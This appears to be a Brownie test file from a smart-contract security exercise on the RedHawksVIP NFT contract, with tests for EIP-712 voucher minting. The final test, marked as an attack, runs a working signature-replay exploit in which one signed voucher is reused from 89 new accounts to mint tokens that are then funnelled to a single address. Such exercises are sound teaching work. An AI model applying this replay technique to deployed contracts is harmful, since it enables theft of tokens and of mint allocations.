import brownie
from brownie import accounts, RedHawksVIP, history, chain, reverts
from eip712.messages import *
import pytest
from brownie.network.alert import Alert
import warnings
#warnings.filterwarnings("ignore", category=DeprecationWarning) 


@pytest.fixture(scope="function", autouse=True)
def redhawk():
    #warnings.filterwarnings("ignore", category=DeprecationWarning)
    dep = accounts.add()
    user = accounts.add()
    attacker = accounts.add()
    vouchersSigner = accounts.add()

    return RedHawksVIP.deploy(vouchersSigner.address, {'from': dep}), vouchersSigner, attacker, user, dep

@pytest.fixture
def signedMsg(redhawk):
    class VoucherData(EIP712Message):
        _chainId_: "uint256" = chain.id
        _verifyingContract_: "address" = redhawk[0].address
        amountOfTickets: "uint256"
        password: "string"

    msg = VoucherData(amountOfTickets=2, password="RedHawksRulzzz133")
    signed = redhawk[1].sign_message(msg)

    return signed


def test_first_Mint(redhawk,signedMsg):
    redhawk[0].mint(2, "RedHawksRulzzz133", signedMsg.signature.hex() , {'from': redhawk[2].address})
    assert(redhawk[0].balanceOf(redhawk[2].address) == 2)

def test_Invalid_pw(redhawk,signedMsg):
    token = redhawk[0]
    with brownie.reverts("Invalid voucher"):
        token.mint(2, "InvalidPW", signedMsg.signature.hex() , {'from': redhawk[4].address})

def test_can_not_reuse(redhawk,signedMsg):
    token = redhawk[0]
    with brownie.reverts("Voucher used"):
        token.mint(2, "RedHawksRulzzz133", signedMsg.signature.hex() , {'from': redhawk[2].address})
        token.mint(2, "RedHawksRulzzz133", signedMsg.signature.hex() , {'from': redhawk[2].address})


def test_replay_attack_exercise_3(redhawk,signedMsg):
    # ATTACK
    def tokenBal(): return redhawk[0].balanceOf(redhawk[1].address)
    accountz = []
    for i in range(0,89):
        accountz.append(accounts.add())
        redhawk[0].mint(2, "RedHawksRulzzz133", signedMsg.signature.hex() , {'from': accountz[i].address}).wait(1)

        tokens =[]
        tokens.append(history[-1].events[0][0]['tokenId'])
        tokens.append(history[-1].events[-1][-1]['tokenId'])
        """         tokens.append(tx.events[0][0]['tokenId'])
        tokens.append(tx.events[-1][-1]['tokenId']) """

        for z in range(0,2):
            redhawk[0].transferFrom(accountz[i].address, redhawk[1].address, tokens[z], {'from': accountz[i]}).wait(1)
            #def tokenBal(): return redhawk[0].balanceOf(redhawk[1].address)
        #Alert(tokenBal, msg="Attacker tokens balance has changed from {} to {}").wait(1)
    assert(redhawk[0].balanceOf(redhawk[1].address) == 178)
